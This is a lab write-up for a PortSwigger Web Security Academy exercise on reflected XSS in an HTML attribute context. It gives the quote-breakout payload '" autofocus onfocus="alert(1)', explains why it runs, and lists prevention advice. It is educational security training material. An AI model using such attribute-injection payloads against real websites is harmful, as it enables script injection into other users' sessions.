# 🚨 Lab 25 — Reflected XSS into Attribute with Angle Brackets HTML-Encoded

## 🧪 Lab Details

| Field | Value |
|---|---|
| **Lab No** | 25 |
| **Lab Name** | Reflected XSS into attribute with angle brackets HTML-encoded |
| **Category** | Reflected XSS |
| **Platform** | PortSwigger Web Security Academy |

---

# 🎯 Goal

Exploit an XSS vulnerability inside an HTML attribute context.

---

# 🔍 Injection Point

- Search Parameter

---

# 🧠 Vulnerability Overview

The application reflects user input into an HTML attribute:

```html
<input value="USER_INPUT">
```

Angle brackets are encoded:

```html
<  → &lt;
>  → &gt;
```

but quotation marks are not properly sanitized.

---

# 💣 Payload

```html
" autofocus onfocus="alert(1)
```

---

# ⚔️ Exploitation Steps

## 1️⃣ Inject Payload

```html
" autofocus onfocus="alert(1)
```

---

## 2️⃣ Break Out of Attribute

The payload closes the existing attribute:

```html
value=""
```

---

## 3️⃣ Inject New Attributes

```html
autofocus
onfocus="alert(1)"
```

---

## 4️⃣ Automatic Execution

`autofocus` automatically focuses the input field.

This triggers:

```javascript
onfocus
```

which executes:

```javascript
alert(1)
```

✅ Reflected XSS Successfully Triggered

---

# 🧨 Why It Works

Even though `<` and `>` are encoded, attackers can still inject attributes using quotation marks.

---

# 🛡️ Prevention

## ✅ Encode Quotes Properly

Escape:

```text
"
'
```

along with angle brackets.

---

## ✅ Context-Aware Encoding

Use proper encoding depending on:

- HTML Body
- HTML Attribute
- JavaScript Context
- URL Context

---

# 💡 Key Takeaway

Encoding `<script>` is not enough.

Attribute injection can still lead to XSS through event handlers like:

```html
onfocus
onclick
onmouseover
```
